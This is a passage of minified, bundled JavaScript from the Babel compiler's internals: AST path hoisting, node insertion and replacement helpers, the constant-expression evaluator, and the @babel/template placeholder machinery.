Q.constantViolations)if(Y.scope!==Q.path.scope){J.mutableBinding=!0,X.stop();return}if(Q!==J.scope.getBinding(X.node.name))return;J.bindings[X.node.name]=Q}};class tO{constructor(X,J){this.breakOnScopePaths=void 0,this.bindings=void 0,this.mutableBinding=void 0,this.scopes=void 0,this.scope=void 0,this.path=void 0,this.attachAfter=void 0,this.breakOnScopePaths=[],this.bindings={},this.mutableBinding=!1,this.scopes=[],this.scope=J,this.path=X,this.attachAfter=!1}isCompatibleScope(X){for(let J of Object.keys(this.bindings)){let Q=this.bindings[J];if(!X.bindingIdentifierEquals(J,Q.identifier))return!1}return!0}getCompatibleScopes(){let X=this.path.scope;do{if(this.isCompatibleScope(X))this.scopes.push(X);else break;if(this.breakOnScopePaths.includes(X.path))break}while(X=X.parent)}getAttachmentPath(){let X=this._getAttachmentPath();if(!X)return;let J=X.scope;if(J.path===X)J=X.scope.parent;if(J.path.isProgram()||J.path.isFunction())for(let Q of Object.keys(this.bindings)){if(!J.hasOwnBinding(Q))continue;let Y=this.bindings[Q];if(Y.kind==="param"||Y.path.parentKey==="params")continue;if(this.getAttachmentParentForPath(Y.path).key>=X.key){this.attachAfter=!0,X=Y.path;for(let z of Y.constantViolations)if(this.getAttachmentParentForPath(z).key>X.key)X=z}}return X}_getAttachmentPath(){let J=this.scopes.pop();if(!J)return;if(J.path.isFunction())if(this.hasOwnParamBindings(J)){if(this.scope===J)return;let Q=J.path.get("body").get("body");for(let Y=0;Y<Q.length;Y++){if(Q[Y].node._blockHoist)continue;return Q[Y]}}else return this.getNextScopeAttachmentParent();else if(J.path.isProgram())return this.getNextScopeAttachmentParent()}getNextScopeAttachmentParent(){let X=this.scopes.pop();if(X)return this.getAttachmentParentForPath(X.path)}getAttachmentParentForPath(X){do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())return X;while(X=X.parentPath)}hasOwnParamBindings(X){for(let J of Object.keys(this.bindings)){if(!X.hasOwnBinding(J))continue;let Q=this.bindings[J];if(Q.kind==="param"&&Q.constant)return!0}return!1}run(){if(this.path.traverse(B_1,this),this.mutableBinding)return;this.getCompatibleScopes();let X=this.getAttachmentPath();if(!X)return;if(X.getFunctionParent()===this.path.getFunctionParent())return;let J=X.scope.generateUidIdentifier("ref"),Q=V_1(J,this.path.node),Y=this.attachAfter?"insertAfter":"insertBefore",[W]=X[Y]([X.isVariableDeclarator()?Q:K_1("var",[Q])]),z=this.path.parentPath;if(z.isJSXElement()&&this.path.container===z.node.children)J=U_1(J);return this.path.replaceWith(H_1(J)),W.isVariableDeclarator()?W.get("init"):W.get("declarations.0.init")}}eO.default=tO});var t4=c((UR)=>{Object.defineProperty(UR,"__esModule",{value:!0});UR._containerInsert=qz;UR._containerInsertAfter=WR;UR._containerInsertBefore=Zz;UR._verifyNodeList=d5;UR.insertAfter=T_1;UR.insertBefore=P_1;UR.pushContainer=E_1;UR.unshiftContainer=__1;UR.updateSiblingKeys=HR;var q_1=xX(),Bz=I6(),Uz=P8(),e4=o4(),Z_1=U0(),M_1=JR(),{arrowFunctionExpression:F_1,assertExpression:j_1,assignmentExpression:O_1,blockStatement:QR,callExpression:R_1,cloneNode:Kz,expressionStatement:Vz,isAssignmentExpression:A_1,isCallExpression:N_1,isExportNamedDeclaration:YR,isExpression:L_1,isIdentifier:D_1,isSequenceExpression:w_1,isSuper:I_1,thisExpression:C_1}=Z_1;function P_1(X){e4._assertUnremoved.call(this);let J=d5.call(this,X),{parentPath:Q,parent:Y}=this;if(Q.isExpressionStatement()||Q.isLabeledStatement()||YR(Y)||Q.isExportDefaultDeclaration()&&this.isDeclaration())return Q.insertBefore(J);else if(this.isNodeType("Expression")&&!this.isJSXElement()||Q.isForStatement()&&this.key==="init"){if(this.node)J.push(this.node);return this.replaceExpressionWithStatements(J)}else if(Array.isArray(this.container))return Zz.call(this,J);else if(this.isStatementOrBlock()){let W=this.node,z=W&&(!this.isExpressionStatement()||W.expression!=null),[G]=this.replaceWith(QR(z?[W]:[]));return G.unshiftContainer("body",J)}else throw new Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function qz(X,J){HR.call(this,X,J.length);let Q=[];this.container.splice(X,0,...J);for(let z=0;z<J.length;z++){var Y;let G=X+z,H=this.getSibling(G);if(Q.push(H),(Y=this.context)!=null&&Y.queue)Uz.pushContext.call(H,this.context)}let W=Uz._getQueueContexts.call(this);for(let z of Q){Uz.setScope.call(z),z.debug("Inserted.");for(let G of W)G.maybeQueue(z,!0)}return Q}function Zz(X){return qz.call(this,this.key,X)}function WR(X){return qz.call(this,this.key+1,X)}var GR=(X)=>X[X.length-1];function zR(X){return w_1(X.parent)&&(GR(X.parent.expressions)!==X.node||zR(X.parentPath))}function S_1(X,J){if(!A_1(X)||!D_1(X.left))return!1;let Q=J.getBlockParent();return Q.hasOwnBinding(X.left.name)&&Q.getOwnBinding(X.left.name).constantViolations.length<=1}function T_1(X){if(e4._assertUnremoved.call(this),this.isSequenceExpression())return GR(this.get("expressions")).insertAfter(X);let J=d5.call(this,X),{parentPath:Q,parent:Y}=this;if(Q.isExpressionStatement()||Q.isLabeledStatement()||YR(Y)||Q.isExportDefaultDeclaration()&&this.isDeclaration())return Q.insertAfter(J.map((W)=>{return L_1(W)?Vz(W):W}));else if(this.isNodeType("Expression")&&!this.isJSXElement()&&!Q.isJSXElement()||Q.isForStatement()&&this.key==="init"){let W=this;if(W.node){let z=W.node,{scope:G}=this;if(G.path.isPattern())return j_1(z),W.replaceWith(R_1(F_1([],z),[])),W.get("callee.body").insertAfter(J),[W];if(zR(W))J.unshift(z);else if(N_1(z)&&I_1(z.callee))J.unshift(z),J.push(C_1());else if(S_1(z,G))J.unshift(z),J.push(Kz(z.left));else if(G.isPure(z,!0))J.push(z);else{if(Q.isMethod({computed:!0,key:z}))G=G.parent;let H=G.generateDeclaredUidIdentifier();J.unshift(Vz(O_1("=",Kz(H),z))),J.push(Vz(Kz(H)))}}return this.replaceExpressionWithStatements(J)}else if(Array.isArray(this.container))return WR.call(this,J);else if(this.isStatementOrBlock()){let W=this.node,z=W&&(!this.isExpressionStatement()||W.expression!=null),[G]=this.replaceWith(QR(z?[W]:[]));return G.pushContainer("body",J)}else throw new Error("We don't know what to do with this node type. We were previously a Statement but we can't fit in here?")}function HR(X,J){if(!this.parent)return;let Q=q_1.getCachedPaths(this);if(!Q)return;for(let[,Y]of Q)if(typeof Y.key==="number"&&Y.container===this.container&&Y.key>=X)Y.key+=J}function d5(X){if(!X)return[];if(!Array.isArray(X))X=[X];for(let J=0;J<X.length;J++){let Q=X[J],Y;if(!Q)Y="has falsy node";else if(typeof Q!=="object")Y="contains a non-object node";else if(!Q.type)Y="without a type";else if(Q instanceof Bz.default)Y="has a NodePath when it expected a raw object";if(Y){let W=Array.isArray(Q)?"array":typeof Q;throw new Error(`Node list ${Y} with the index of ${J} and type of ${W}`)}}return X}function __1(X,J){e4._assertUnremoved.call(this);let Q=d5.call(this,J),Y=this.node[X],W=Bz.default.get({parentPath:this,parent:this.node,container:Y,listKey:X,key:0}).setContext(this.context);return Zz.call(W,Q)}function E_1(X,J){e4._assertUnremoved.call(this);let Q=d5.call(this,J),Y=this.node[X];return Bz.default.get({parentPath:this,parent:this.node,container:Y,listKey:X,key:Y.length}).setContext(this.context).replaceWithMultiple(Q)}UR.hoist=function X(J=this.scope){return new M_1.default(this,J).run()}});var Hz=c((OR)=>{Object.defineProperty(OR,"__esModule",{value:!0});OR._replaceWith=jR;OR.replaceExpressionWithStatements=ZE1;OR.replaceInline=ME1;OR.replaceWith=qE1;OR.replaceWithMultiple=VE1;OR.replaceWithSourceString=BE1;var m_1=Gz(),Fz=g5(),u_1=I6(),ZR=xX(),jz=t4(),c_1=U4(),l_1=U0(),oJ=P8(),{FUNCTION_TYPES:KR,arrowFunctionExpression:p_1,assignmentExpression:MR,awaitExpression:d_1,blockStatement:i_1,buildUndefinedNode:Mz,callExpression:r_1,cloneNode:Oz,conditionalExpression:n_1,expressionStatement:a_1,getBindingIdentifiers:s_1,identifier:o_1,inheritLeadingComments:t_1,inheritTrailingComments:e_1,inheritsComments:XE1,isBlockStatement:JE1,isEmptyStatement:VR,isExpression:FR,isExpressionStatement:QE1,isIfStatement:YE1,isProgram:WE1,isStatement:GE1,isVariableDeclaration:zE1,removeComments:HE1,returnStatement:BR,sequenceExpression:UE1,validate:qR,yieldExpression:KE1}=l_1;function VE1(X){var J;oJ.resync.call(this);let Q=jz._verifyNodeList.call(this,X);t_1(Q[0],this.node),e_1(Q[Q.length-1],this.node),(J=ZR.getCachedPaths(this))==null||J.delete(this.node),this.node=this.container[this.key]=null;let Y=this.insertAfter(X);if(this.node)this.requeue();else this.remove();return Y}function BE1(X){oJ.resync.call(this);let J;try{X=`(${X})`,J=c_1.parse(X)}catch(Y){let W=Y.loc;if(W)Y.message+=` - make sure this is an expression.
`+m_1.codeFrameColumns(X,{start:{line:W.line,column:W.column+1}}),Y.code="BABEL_REPLACE_SOURCE_ERROR";throw Y}let Q=J.program.body[0].expression;return Fz.default.removeProperties(Q),this.replaceWith(Q)}function qE1(X){if(oJ.resync.call(this),this.removed)throw new Error("You can't replace this node, we've already removed it");let J=X instanceof u_1.default?X.node:X;if(!J)throw new Error("You passed `path.replaceWith()` a falsy node, use `path.remove()` instead");if(this.node===J)return[this];if(this.isProgram()&&!WE1(J))throw new Error("You can only replace a Program root node with another Program node");if(Array.isArray(J))throw new Error("Don't use `path.replaceWith()` with an array of nodes, use `path.replaceWithMultiple()`");if(typeof J==="string")throw new Error("Don't use `path.replaceWith()` with a source string, use `path.replaceWithSourceString()`");let Q="";if(this.isNodeType("Statement")&&FR(J)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(J)&&!this.parentPath.isExportDefaultDeclaration())J=a_1(J),Q="expression"}if(this.isNodeType("Expression")&&GE1(J)){if(!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(J))return this.replaceExpressionWithStatements([J])}let Y=this.node;if(Y)XE1(J,Y),HE1(Y);return jR.call(this,J),this.type=J.type,oJ.setScope.call(this),this.requeue(),[Q?this.get(Q):this]}function jR(X){var J;if(!this.container)throw new ReferenceError("Container is falsy");if(this.inList)qR(this.parent,this.key,[X]);else qR(this.parent,this.key,X);this.debug(`Replace with ${X==null?void 0:X.type}`),(J=ZR.getCachedPaths(this))==null||J.set(X,this).delete(this.node),this.node=this.container[this.key]=X}function ZE1(X){oJ.resync.call(this);let J=[],Q=X2(X,J);if(Q){for(let Z of J)this.scope.push({id:Z});return this.replaceWith(Q)[0].get("expressions")}let Y=this.getFunctionParent(),W=Y==null?void 0:Y.node.async,z=Y==null?void 0:Y.node.generator,G=p_1([],i_1(X));this.replaceWith(r_1(G,[]));let H=this.get("callee");H.get("body").scope.hoistVariables((Z)=>this.scope.push({id:Z}));let U=H.getCompletionRecords();for(let Z of U){if(!Z.isExpressionStatement())continue;let M=Z.findParent((F)=>F.isLoop());if(M){let F=M.getData("expressionReplacementReturnUid");if(!F)F=H.scope.generateDeclaredUidIdentifier("ret"),H.get("body").pushContainer("body",BR(Oz(F))),M.setData("expressionReplacementReturnUid",F);else F=o_1(F.name);Z.get("expression").replaceWith(MR("=",Oz(F),Z.node.expression))}else Z.replaceWith(BR(Z.node.expression))}H.arrowFunctionToExpression();let K=H,V=W&&Fz.default.hasType(this.get("callee.body").node,"AwaitExpression",KR),B=z&&Fz.default.hasType(this.get("callee.body").node,"YieldExpression",KR);if(V){if(K.set("async",!0),!B)this.replaceWith(d_1(this.node))}if(B)K.set("generator",!0),this.replaceWith(KE1(this.node,!0));return K.get("body.body")}function X2(X,J){let Q=[],Y=!0;for(let W of X){if(!VR(W))Y=!1;if(FR(W))Q.push(W);else if(QE1(W))Q.push(W.expression);else if(zE1(W)){if(W.kind!=="var")return;for(let z of W.declarations){let G=s_1(z);for(let H of Object.keys(G))J.push(Oz(G[H]));if(z.init)Q.push(MR("=",z.id,z.init))}Y=!0}else if(YE1(W)){let z=W.consequent?X2([W.consequent],J):Mz(),G=W.alternate?X2([W.alternate],J):Mz();if(!z||!G)return;Q.push(n_1(W.test,z,G))}else if(JE1(W)){let z=X2(W.body,J);if(!z)return;Q.push(z)}else if(VR(W)){if(X.indexOf(W)===0)Y=!0}else return}if(Y)Q.push(Mz());if(Q.length===1)return Q[0];else return UE1(Q)}function ME1(X){if(oJ.resync.call(this),Array.isArray(X))if(Array.isArray(this.container)){X=jz._verifyNodeList.call(this,X);let J=jz._containerInsertAfter.call(this,X);return this.remove(),J}else return this.replaceWithMultiple(X);else return this.replaceWith(X)}});var DR=c((LR)=>{Object.defineProperty(LR,"__esModule",{value:!0});LR.evaluate=TE1;LR.evaluateTruthy=PE1;var LE1=["Number","String","Math"],DE1=["isFinite","isNaN","parseFloat","parseInt","decodeURI","decodeURIComponent","encodeURI","encodeURIComponent",null,null],wE1=["random"];function RR(X){return LE1.includes(X)}function IE1(X){return DE1.includes(X)}function CE1(X){return wE1.includes(X)}function PE1(){let X=this.evaluate();if(X.confident)return!!X.value}function S8(X,J){if(!J.confident)return;J.deoptPath=X,J.confident=!1}var AR=new Map([["undefined",void 0],["Infinity",1/0],["NaN",NaN]]);function T9(X,J){let{node:Q}=X,{seen:Y}=J;if(Y.has(Q)){let W=Y.get(Q);if(W.resolved)return W.value;else{S8(X,J);return}}else{let W={resolved:!1};Y.set(Q,W);let z=SE1(X,J);if(J.confident)W.resolved=!0,W.value=z;return z}}function SE1(X,J){if(!J.confident)return;if(X.isSequenceExpression()){let Y=X.get("expressions");return T9(Y[Y.length-1],J)}if(X.isStringLiteral()||X.isNumericLiteral()||X.isBooleanLiteral())return X.node.value;if(X.isNullLiteral())return null;if(X.isTemplateLiteral())return NR(X,X.node.quasis,J);if(X.isTaggedTemplateExpression()&&X.get("tag").isMemberExpression()){let Y=X.get("tag.object"),{node:{name:W}}=Y,z=X.get("tag.property");if(Y.isIdentifier()&&W==="String"&&!X.scope.getBinding(W)&&z.isIdentifier()&&z.node.name==="raw")return NR(X,X.node.quasi.quasis,J,!0)}if(X.isConditionalExpression()){let Y=T9(X.get("test"),J);if(!J.confident)return;if(Y)return T9(X.get("consequent"),J);else return T9(X.get("alternate"),J)}if(X.isExpressionWrapper())return T9(X.get("expression"),J);if(X.isMemberExpression()&&!X.parentPath.isCallExpression({callee:X.node})){let Y=X.get("property"),W=X.get("object");if(W.isLiteral()){let z=W.node.value,G=typeof z,H=null;if(X.node.computed){if(H=T9(Y,J),!J.confident)return}else if(Y.isIdentifier())H=Y.node.name;if((G==="number"||G==="string")&&H!=null&&(typeof H==="number"||typeof H==="string"))return z[H]}}if(X.isReferencedIdentifier()){let Y=X.scope.getBinding(X.node.name);if(Y){if(Y.constantViolations.length>0||X.node.start<Y.path.node.end){S8(Y.path,J);return}let H=Y.path.scope;if(Y.kind==="var"&&H!==Y.scope){let U=!H.path.parentPath.isBlockStatement();for(let K=H.parent;K;K=K.parent){var Q;if(K===X.scope){if(U){S8(Y.path,J);return}break}if((Q=K.path.parentPath)!=null&&Q.isBlockStatement())U=!0}}if(Y.hasValue)return Y.value}let W=X.node.name;if(AR.has(W)){if(!Y)return AR.get(W);S8(Y.path,J);return}let z=X.resolve();if(z===X){S8(X,J);return}let G=T9(z,J);if(typeof G==="object"&&G!==null&&Y.references>1){S8(z,J);return}return G}if(X.isUnaryExpression({prefix:!0})){if(X.node.operator==="void")return;let Y=X.get("argument");if(X.node.operator==="typeof"&&(Y.isFunction()||Y.isClass()))return"function";let W=T9(Y,J);if(!J.confident)return;switch(X.node.operator){case"!":return!W;case"+":return+W;case"-":return-W;case"~":return~W;case"typeof":return typeof W}}if(X.isArrayExpression()){let Y=[],W=X.get("elements");for(let z of W){let G=z.evaluate();if(G.confident)Y.push(G.value);else{S8(G.deopt,J);return}}return Y}if(X.isObjectExpression()){let Y={},W=X.get("properties");for(let z of W){if(z.isObjectMethod()||z.isSpreadElement()){S8(z,J);return}let G=z.get("key"),H;if(z.node.computed){if(H=G.evaluate(),!H.confident){S8(H.deopt,J);return}H=H.value}else if(G.isIdentifier())H=G.node.name;else H=G.node.value;let K=z.get("value").evaluate();if(!K.confident){S8(K.deopt,J);return}K=K.value,Y[H]=K}return Y}if(X.isLogicalExpression()){let Y=J.confident,W=T9(X.get("left"),J),z=J.confident;J.confident=Y;let G=T9(X.get("right"),J),H=J.confident;switch(X.node.operator){case"||":if(J.confident=z&&(!!W||H),!J.confident)return;return W||G;case"&&":if(J.confident=z&&(!W||H),!J.confident)return;return W&&G;case"??":if(J.confident=z&&(W!=null||H),!J.confident)return;return W!=null?W:G}}if(X.isBinaryExpression()){let Y=T9(X.get("left"),J);if(!J.confident)return;let W=T9(X.get("right"),J);if(!J.confident)return;switch(X.node.operator){case"-":return Y-W;case"+":return Y+W;case"/":return Y/W;case"*":return Y*W;case"%":return Y%W;case"**":return Math.pow(Y,W);case"<":return Y<W;case">":return Y>W;case"<=":return Y<=W;case">=":return Y>=W;case"==":return Y==W;case"!=":return Y!=W;case"===":return Y===W;case"!==":return Y!==W;case"|":return Y|W;case"&":return Y&W;case"^":return Y^W;case"<<":return Y<<W;case">>":return Y>>W;case">>>":return Y>>>W}}if(X.isCallExpression()){let Y=X.get("callee"),W,z;if(Y.isIdentifier()&&!X.scope.getBinding(Y.node.name)&&(RR(Y.node.name)||IE1(Y.node.name)))z=global[Y.node.name];if(Y.isMemberExpression()){let G=Y.get("object"),H=Y.get("property");if(G.isIdentifier()&&H.isIdentifier()&&RR(G.node.name)&&!CE1(H.node.name)){W=global[G.node.name];let U=H.node.name;if(hasOwnProperty.call(W,U))z=W[U]}if(G.isLiteral()&&H.isIdentifier()){let U=typeof G.node.value;if(U==="string"||U==="number")W=G.node.value,z=W[H.node.name]}}if(z){let G=X.get("arguments").map((H)=>T9(H,J));if(!J.confident)return;return z.apply(W,G)}}S8(X,J)}function NR(X,J,Q,Y=!1){let W="",z=0,G=X.isTemplateLiteral()?X.get("expressions"):X.get("quasi.expressions");for(let H of J){if(!Q.confident)break;W+=Y?H.value.raw:H.value.cooked;let U=G[z++];if(U)W+=String(T9(U,Q))}if(!Q.confident)return;return W}function TE1(){let X={confident:!0,deoptPath:null,seen:new Map},J=T9(this,X);if(!X.confident)J=void 0;return{confident:X.confident,deopt:X.deoptPath,value:J}}});var CR=c((wR)=>{Object.defineProperty(wR,"__esModule",{value:!0});wR.statements=wR.statement=wR.smart=wR.program=wR.expression=void 0;var $E1=U0(),{assertExpressionStatement:kE1}=$E1;function Rz(X){return{code:(J)=>`/* @babel/template */;
${J}`,validate:()=>{},unwrap:(J)=>{return X(J.program.body.slice(1))}}}var E00=wR.smart=Rz((X)=>{if(X.length>1)return X;else return X[0]}),$00=wR.statements=Rz((X)=>X),k00=wR.statement=Rz((X)=>{if(X.length===0)throw new Error("Found nothing to return.");if(X.length>1)throw new Error("Found multiple statements but wanted one");return X[0]}),bE1=wR.expression={code:(X)=>`(
${X}
)`,validate:(X)=>{if(X.program.body.length>1)throw new Error("Found multiple statements but wanted one");if(bE1.unwrap(X).start===0)throw new Error("Parse result included parens.")},unwrap:({program:X})=>{let[J]=X.body;return kE1(J),J.expression}},b00=wR.program={code:(X)=>X,validate:()=>{},unwrap:(X)=>X.program}});var J2=c((PR)=>{Object.defineProperty(PR,"__esModule",{value:!0});PR.merge=mE1;PR.normalizeReplacements=cE1;PR.validate=uE1;var hE1=["placeholderWhitelist","placeholderPattern","preserveComments","syntacticPlaceholders"];function yE1(X,J){if(X==null)return{};var Q={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(J.indexOf(Y)!==-1)continue;Q[Y]=X[Y]}return Q}function mE1(X,J){let{placeholderWhitelist:Q=X.placeholderWhitelist,placeholderPattern:Y=X.placeholderPattern,preserveComments:W=X.preserveComments,syntacticPlaceholders:z=X.syntacticPlaceholders}=J;return{parser:Object.assign({},X.parser,J.parser),placeholderWhitelist:Q,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:z}}function uE1(X){if(X!=null&&typeof X!=="object")throw new Error("Unknown template options.");let J=X||{},{placeholderWhitelist:Q,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:z}=J,G=yE1(J,hE1);if(Q!=null&&!(Q instanceof Set))throw new Error("'.placeholderWhitelist' must be a Set, null, or undefined");if(Y!=null&&!(Y instanceof RegExp)&&Y!==!1)throw new Error("'.placeholderPattern' must be a RegExp, false, null, or undefined");if(W!=null&&typeof W!=="boolean")throw new Error("'.preserveComments' must be a boolean, null, or undefined");if(z!=null&&typeof z!=="boolean")throw new Error("'.syntacticPlaceholders' must be a boolean, null, or undefined");if(z===!0&&(Q!=null||Y!=null))throw new Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");return{parser:G,placeholderWhitelist:Q||void 0,placeholderPattern:Y==null?void 0:Y,preserveComments:W==null?void 0:W,syntacticPlaceholders:z==null?void 0:z}}function cE1(X){if(Array.isArray(X))return X.reduce((J,Q,Y)=>{return J["$"+Y]=Q,J},{});else if(typeof X==="object"||X==null)return X||void 0;throw new Error("Template replacements must be an array, object, null, or undefined")}});var Az=c((TR)=>{Object.defineProperty(TR,"__esModule",{value:!0});TR.default=G$1;var iE1=U0(),rE1=U4(),nE1=Gz(),{isCallExpression:aE1,isExpressionStatement:sE1,isFunction:oE1,isIdentifier:tE1,isJSXIdentifier:eE1,isNewExpression:X$1,isPlaceholder:Q2,isStatement:J$1,isStringLiteral:SR,removePropertiesDeep:Q$1,traverse:Y$1}=iE1,W$1=/^[_$A-Z0-9]+$/;function G$1(X,J,Q){let{placeholderWhitelist:Y,placeholderPattern:W,preserveComments:z,syntacticPlaceholders:G}=Q,H=U$1(J,Q.parser,G);Q$1(H,{preserveComments:z}),X.validate(H);let U={syntactic:{placeholders:[],placeholderNames:new Set},legacy:{placeholders:[],placeholderNames:new Set},placeholderWhitelist:Y,placeholderPattern:W,syntacticPlaceholders:G};return Y$1(H,z$1,U),Object.assign({ast:H},U.syntactic.placeholders.length?U.syntactic:U.legacy)}function z$1(X,J,Q){var Y;let W,z=Q.syntactic.placeholders.length>0;if(Q2(X)){if(Q.syntacticPlaceholders===!1)throw new Error("%%foo%%-style placeholders can't be used when '.syntacticPlaceholders' is false.");W=X.name.name,z=!0}else if(z||Q.syntacticPlaceholders)return;else if(tE1(X)||eE1(X))W=X.name;else if(SR(X))W=X.value;else return;if(z&&(Q.placeholderPattern!=null||Q.placeholderWhitelist!=null))throw new Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");if(!z&&(Q.placeholderPattern===!1||!(Q.placeholderPattern||W$1).test(W))&&!((Y=Q.placeholderWhitelist)!=null&&Y.has(W)))return;J=J.slice();let{node:G,key:H}=J[J.length-1],U;if(SR(X)||Q2(X,{expectedNode:"StringLiteral"}))U="string";else if(X$1(G)&&H==="arguments"||aE1(G)&&H==="arguments"||oE1(G)&&H==="params")U="param";else if(sE1(G)&&!Q2(X))U="statement",J=J.slice(0,-1);else if(J$1(X)&&Q2(X))U="statement";else U="other";let{placeholders:K,placeholderNames:V}=!z?Q.legacy:Q.syntactic;K.push({name:W,type:U,resolve:(B)=>H$1(B,J),isDuplicate:V.has(W)}),V.add(W)}function H$1(X,J){let Q=X;for(let z=0;z<J.length-1;z++){let{key:G,index:H}=J[z];if(H===void 0)Q=Q[G];else Q=Q[G][H]}let{key:Y,index:W}=J[J.length-1];return{parent:Q,key:Y,index:W}}function U$1(X,J,Q){let Y=(J.plugins||[]).slice();if(Q!==!1)Y.push("placeholders");J=Object.assign({allowAwaitOutsideFunction:!0,allowReturnOutsideFunction:!0,allowNewTargetOutsideFunction:!0,allowSuperOutsideMethod:!0,allowYieldOutsideFunction:!0,sourceType:"module"},J,{plugins:Y});try{return rE1.parse(X,J)}catch(W){let z=W.loc;if(z)W.message+=`
`+nE1.codeFrameColumns(X,{start:z}),W.code="BABEL_TEMPLATE_PARSE_ERROR";throw W}}});var Dz=c(($R)=>{Object.defineProperty($R,"__esModule",{value:!0});$R.default=F$1;var V$1=U0(),{blockStatement:B$1,cloneNode:Lz,emptyStatement:q$1,expressionStatement:Nz,identifier:Y2,isStatement:_R,isStringLiteral:Z$1,stringLiteral:M$1,validate:ER}=V$1;function F$1(X,J){let Q=Lz(X.ast);if(J)X.placeholders.forEach((Y)=>{if(!hasOwnProperty.call(J,Y.name)){let W=Y.name;throw new Error(`Error: No substitution given for "${W}". If this is not meant to be a
            placeholder you may want to consider passing one of the following options to @babel/template:
            - { placeholderPattern: false, placeholderWhitelist: new Set(['${W}'])}
            - { placeholderPattern: /^${W}$/ }`)}}),Object.keys(J).forEach((Y)=>{if(!X.placeholderNames.has(Y))throw new Error(`Unknown substitution "${Y}" given`)});return X.placeholders.slice().reverse().forEach((Y)=>{try{var W;j$1(Y,Q,(W=J&&J[Y.name])!=null?W:null)}catch(z){throw z.message=`@babel/template placeholder "${Y.name}": ${z.message}`,z}}),Q}function j$1(X,J,Q){if(X.isDuplicate){if(Array.isArray(Q))Q=Q.map((H)=>Lz(H));else if(typeof Q==="object")Q=Lz(Q)}let{parent:Y,key:W,index:z}=X.resolve(J);if(X.type==="string"){if(typeof Q==="string")Q=M$1(Q);if(!Q||!Z$1(Q))throw new Error("Expected string substitution")}else if(X.type==="statement"){if(z===void 0){if(!Q)Q=q$1();else if(Array.isArray(Q))Q=B$1(Q);else if(typeof Q==="string")Q=Nz(Y2(Q));else if(!_R(Q))Q=Nz(Q)}else if(Q&&!Array.isArray(Q)){if(typeof Q==="string")Q=Y2(Q);if(!_R(Q))Q=Nz(Q)}}else if(X.type==="param"){if(typeof Q==="string")Q=Y2(Q);if(z===void 0)throw new Error("Assertion failure.")}else{if(typeof Q==="string")Q=Y2(Q);if(Array.isArray(Q))throw new Error("Cannot replace single expression with an array.")}function G(H,U,K){let V=H[U];if(H[U]=K,V.type==="Identifier"||V.type==="Placeholder"){if(V.typeAnnotation)K.typeAnnotation=V.typeAnnotation;if(V.optional)K.optional=V.optional;if(V.decorators)K.decorators=V.decorators}}if(z===void 0)ER(Y,W,Q),G(Y,W,Q);else{let H=Y[W].slice();if(X.type==="statement"||X.type==="param")if(Q==null)H.splice(z,1);else if(Array.isArray(Q))H.splice(z,1,...Q);else G(H,z,Q);else G(H,z,Q);ER(Y,W,H),Y[W]=H}}});var bR=c((kR)=>{Object.defineProperty(kR,"__esModule",{value:!0});kR.default=L$1;var R$1=J2(),A$1=Az(),N$1=Dz();function L$1(X,J,Q){J=X.code(J);let Y;return(W)=>{let z=R$1.normalizeReplacements(W);if(!Y)Y=A$1.default(X,J,Q);return X.unwrap(N$1.default(Y,z))}}});var xR=c((vR)=>{Object.defineProperty(vR,"__esModule",{value:!0});vR.default=P$1;var w$1=J2(),I$1=Az(),C$1=Dz();function P$1(X,J,Q){let{metadata:Y,names:W}=S$1(X,J,Q);return(z)=>{let G={};return z.forEach((H,U)=>{G[W[U]]=H}),(H)=>{let U=w$1.normalizeReplacements(H);if(U)Object.keys(U).forEach((K)=>{if(hasOwnProperty.call(G,K))throw new Error("Unexpected replacement overlap.")});return X.unwrap(C$1.default(Y,U?Object.assign(U,G):G))}}}function S$1(X,J,Q){let Y="BABEL_TPL$",W=J.join("");do Y="$$"+Y;while(W.includes(Y));let{names:z,code:G}=T$1(J,Y);return{metadata:I$1.default(X,X.code(G),{parser:Q.parser,placeholderWhitelist:new Set(z.concat(Q.placeholderWhitelist?Array.from(Q.placeholderWhitelist):[])),placeholderPattern:Q.placeholderPattern,preserveComments:Q.preserveComments,syntacticPlaceholders:Q.syntacticPlaceholders}),names:z}}function T$1(X,J){let Q=[],Y=X[0];for(let W=1;W<X.length;W++){let z=`${J}${W-1}`;Q.push(z),Y+=z+X[W]}return{names:Q,code:Y}}});var cR=c((uR)=>{Object.defineProperty(uR,"__esModule",{value:!0});uR.default=mR;var o8=J2(),fR=bR(),gR=xR(),hR=o8.validate({placeholderPattern:!1});function mR(X,J){let Q=new WeakMap,Y=new WeakMap,W=J||o8.validate(null);return Object.assign((z,...G)=>{if(typeof z==="string"){if(G.length>1)throw new Error("Unexpected extra params.");return yR(fR.default(X,z,o8.merge(W,o8.validate(G[0]))))}else if(Array.isArray(z)){let H=Q.get(z);if(!H)H=gR.default(X,z,W),Q.set(z,H);return yR(H(G))}else if(typeof z==="object"&&z){if(G.length>0)throw new Error("Unexpected extra params.");return mR(X,o8.merge(W,o8.validate(z)))}throw new Error(`Unexpected template param ${typeof z}`)},{ast:(z,...G)=>{if(typeof z==="string"){if(G.length>1)throw new Error("Unexpected extra params.");return fR.default(X,z,o8.merge(o8.merge(W,o8.validate(G[0])),hR))()}else if(Array.isArray(z)){let H=Y.get(z);if(!H)H=gR.default(X,z,o8.merge(W,hR)),Y.set(z,H);return H(G)()}throw new Error(`Unexpected template param ${typeof z}`)}})}function yR(X){let J="";try{throw new Error}catch(Q){if(Q.stack)J=Q.stack.split(`
`).slice(3).join(`
`)}return(Q)=>{try{return X(Q)}catch(Y){throw Y.stack+=`
    =============
